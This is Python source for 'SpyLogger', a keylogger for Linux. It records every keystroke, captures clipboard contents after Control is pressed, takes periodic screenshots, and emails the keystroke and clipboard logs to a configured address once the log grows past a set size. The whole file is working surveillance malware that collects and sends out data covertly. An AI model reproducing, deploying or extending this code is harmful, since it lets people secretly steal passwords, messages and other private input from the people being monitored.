"""
Copyright (c) 2017, Mehdi Dream-H
All rights reserved.

SpyLogger multiplatform app written in python.
"""

import os
import time
import threading
import pyscreenshot as ImageGrab

from Clipboard.linux import getClipboardData
from mail import *

from Pyxhook import pyxhook

from config import *


def CheckPathExist(path):
	if not os.path.exists(path) and len(path) > 1:
		os.makedirs(path)

CheckPathExist(KEYLOG_PATH)
CheckPathExist(CLIPLOG_PATH)
CheckPathExist(SCREENSHOT_PATH)

# Path and filename can be changed in config.py
keylog = KEYLOG_PATH + KEYLOG_NAME
cliplog = CLIPLOG_PATH + CLIPLOG_NAME


class setInterval:
    def __init__(self, interval, action):
        self.interval = interval
        self.action = action
        self.stopEvent = threading.Event()
        thread = threading.Thread(target=self.__setInterval)
        thread.start()

    def __setInterval(self):
        nextTime = time.time()+self.interval
        while not self.stopEvent.wait(nextTime-time.time()):
            nextTime += self.interval
            self.action()

    def cancel(self):
        self.stopEvent.set()

class Logging:
	def __init__(self, path, data):
		self.path = path
		self.data = data
	
	def SaveLog(self):
		fob = open(self.path, 'a')
		fob.write(''+self.data)
		fob.write('\n')
		fob.close()
	def CloseLog(self):
		fob = open(self.path, 'a')
		fob.close()


def ScreenShot():
	FILENAME = time.strftime("%Y%m%d-%H%M%S")
	img = ImageGrab.grab()
	img.save(SCREENSHOT_PATH + FILENAME + '.jpg', 'JPEG')


def FileToString(path):
	# file = open('data.txt', 'r')
	# text = file.read().strip()
	# file.close()
	with open(path, 'r') as myfile:
		data=myfile.read().replace('\n', '')
	return data


inter = setInterval(SCREENSHOT_TIMER, ScreenShot)


def sendTxtEmail():
	message = "KEYLOG : \n "+FileToString(keylog) + "\n\n\n CLIPLOG : \n" + FileToString(cliplog)
	sendmail(EMAIL_FROM, PASSWORD, EMAIL_TO, SUBJECT, message)


keylog_size = KEYLOG_SIZE
cliplog_size = CLIPLOG_SIZE

def OnKeyPress(event):
  	logging_key = Logging(keylog, event.Key)
  	logging_key.SaveLog()
	sizefile_key = os.path.getsize(keylog)
	# sizefile_clip = os.path.getsize(cliplog)
	# print(sizefile_key)
	global keylog_size
	global cliplog_size
	if int(sizefile_key) > keylog_size:
		sendTxtEmail()
		keylog_size = keylog_size*10

  	if event.Key=='[5053]':
  	  	logging_key.CloseLog()
		t = threading.Timer(0, inter.cancel)
		t.start()
  	  	new_hook.cancel()

def OnKeyUnPress(event):
	if event.Key == 'Control_L':  # or event.Key == 'C'
		clip = "- "+getClipboardData()
		logging_clip = Logging(cliplog, clip)
		logging_clip.SaveLog()


new_hook = pyxhook.HookManager()  # instantiate HookManager class
new_hook.KeyDown = OnKeyPress  # listen to all KeyDown
new_hook.KeyUp = OnKeyUnPress  # listen to all KeyUp
new_hook.HookKeyboard()  # hook the keyboard
new_hook.start()  # start the session
print new_hook.KeyDown
